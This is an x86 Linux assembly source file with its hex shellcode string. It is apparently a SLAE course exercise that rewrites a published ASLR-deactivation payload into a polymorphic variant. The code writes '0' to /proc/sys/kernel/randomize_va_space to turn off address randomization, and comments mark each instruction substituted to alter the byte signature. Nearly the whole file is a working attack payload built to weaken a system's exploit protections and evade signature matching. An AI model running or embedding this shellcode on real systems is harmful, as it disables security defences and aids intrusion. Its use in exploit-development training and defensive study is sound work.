; Original Title:	Linux x86 ASLR deactivation - 83 bytes
; Original Author:	Jean Pascal Pereira <pereira@secbiz.de>
; Original Web:	http://0xffe4.org
;
; ======================================================================================
;
; Title: Linux x86 ASLR deactivation - 99 bytes
; Shellcode : \x31\xed\xeb\x37\x5b\x31\xc0\x50\x66\xb9\x5e\x01\x66\x81\xc1\x5e\x01\xb0\x04\x04\x04\xcd\x80\x89\xc3\x50\x99\x66\xba\x18\x1d\x66\x81\xc2\x18\x1d\x66\x52\x89\xe1\x99\x42\xb0\x02\x04\x02\xcd\x80\xb0\x03\x04\x03\xcd\x80\x83\xc0\x01\xcd\x80\xe8\xc4\xff\xff\xff\x2f\x70\x72\x6f\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x7a\x65\x5f\x76\x61\x5f\x73\x70\x61\x63\x65
; Author: thryb <https://www.github.com/thryb/SLAE-770>
; SLAE ID: SLAE-770
;


global _start
section .text
_start:

xor ebp, ebp
jmp short shell

main:

    pop ebx
    xor     eax, eax
    push    eax

    ; Replaced with a jump call pop technique
    ;push   0x65636170
    ;push   0x735f6176
    ;push   0x5f657a69
    ;push   0x6d6f646e
    ;push   0x61722f6c
    ;push   0x656e7265
    ;push   0x6b2f7379
    ;push   0x732f636f
    ;push   0x72702f2f
    ;mov    ebx,esp ; replaced by pop ebx

    ;mov    cx,0x2bc
    ; replaced with
    ; --- start --- 
    mov    cx, 0x15e
    add    cx, 0x15e
    ; --- end ---

    ;mov    al, 0x8
    ; replaced with
    ; --- start ---
    mov    al, 0x4
    add    al, 0x4
    ; --- end ---

    int    0x80
    mov    ebx,eax
    push   eax

    ;mov    dx,0x3a30
    ; replaced with
    ; --- start ---
    cdq ; added to correct the shellcode
    mov    dx, 0x1d18
    add    dx, 0x1d18
    push   dx
    mov    ecx,esp
    ; --- end ---

    ;xor   edx, edx
    ; replaced with
    ; --- start ---
    cdq
    ; --- end --- 
    inc    edx

    ; mov    al,0x4
    ; replaced with
    ; --- start ---
    mov    al, 0x2
    add    al, 0x2
    ; --- end ---
    int    0x80

    ;mov    al,0x6
    ; replaced with
    ; --- start ---
    mov    al, 0x3
    add    al, 0x3
    ; --- end ---
    int    0x80

    ;inc    eax
    ; replaced with
    ; --- start ---
    add    eax, 0x1
    ; --- end ---
    int    0x80

shell:
call main
file: db "/proc/sys/kernel/randomize_va_space"
